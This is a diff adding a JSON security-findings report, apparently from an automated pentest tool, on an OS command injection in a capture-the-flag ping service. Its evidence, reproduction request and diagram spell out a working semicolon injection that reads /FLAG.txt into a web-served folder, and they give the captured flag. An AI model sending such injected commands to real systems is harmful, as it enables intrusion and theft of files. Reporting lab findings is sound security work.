@@ -1,0 +1,32 @@
+{
+  "meta": {
+    "created": "2026-04-12T21:19:35.533774+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "c4bcf0c6-cb09-448b-bf98-cffbb053e8f1",
+      "timestamp": "2026-04-12T21:19:35.533632+00:00",
+      "title": "OS Command Injection in Ping Tool (CTF Flag Extracted)",
+      "severity": "critical",
+      "target": "http://172.17.0.1:47841/ping",
+      "description": "The /ping endpoint passes user-supplied ip_address parameter directly to a shell command without sanitization. The application runs ping and checks stdout for success patterns, making it 'almost blind' \u2014 command output is not echoed back to the user. Exploitation used semicolon injection to redirect command output to the web-accessible /static/ directory, then fetched the result via HTTP. This allowed reading /FLAG.txt from the container root.",
+      "evidence": "POST /ping ip_address=127.0.0.1; cat /FLAG.txt > /app/static/flag.txt\nGET /static/flag.txt\nResponse body: flag{2fd3f08a-0619-40ce-8866-fd6864c3d1b8}",
+      "tool_used": "http_request",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "POST http://172.17.0.1:47841/ping\nContent-Type: application/x-www-form-urlencoded\n\nip_address=127.0.0.1%3B+cat+/FLAG.txt+>+/app/static/flag.txt",
+        "expected": "flag{2fd3f08a-0619-40ce-8866-fd6864c3d1b8} readable at /static/flag.txt"
+      }
+    }
+  ],
+  "diagrams": [
+    {
+      "id": "e1408690-54d8-4b4e-9b7f-d1891c1f5863",
+      "timestamp": "2026-04-12T21:19:48.854978+00:00",
+      "title": "CTF Target Architecture",
+      "mermaid": "flowchart TD\n  Browser[\"Browser / Attacker\"] --> Form[\"GET / - Ping Tool Form\"]\n  Form --> PingEndpoint[\"/ping POST - ip_address param\"]\n  PingEndpoint --> Shell[\"Shell: ping -c 1 {ip_address}\"]\n  Shell --> OutputCheck[\"Check stdout for reachable patterns\"]\n  OutputCheck --> Response[\"Host is reachable / unreachable\"]\n  Shell --> CMDI[\"INJECTION: 127.0.0.1; cat /FLAG.txt > /app/static/flag.txt\"]\n  CMDI --> FlagFile[\"/FLAG.txt - Contains CTF flag\"]\n  FlagFile --> StaticDir[\"/app/static/flag.txt\"]\n  StaticDir --> StaticServe[\"GET /static/flag.txt\"]\n  StaticServe --> Flag[\"flag{2fd3f08a-0619-40ce-8866-fd6864c3d1b8}\"]"
+    }
+  ]
+}
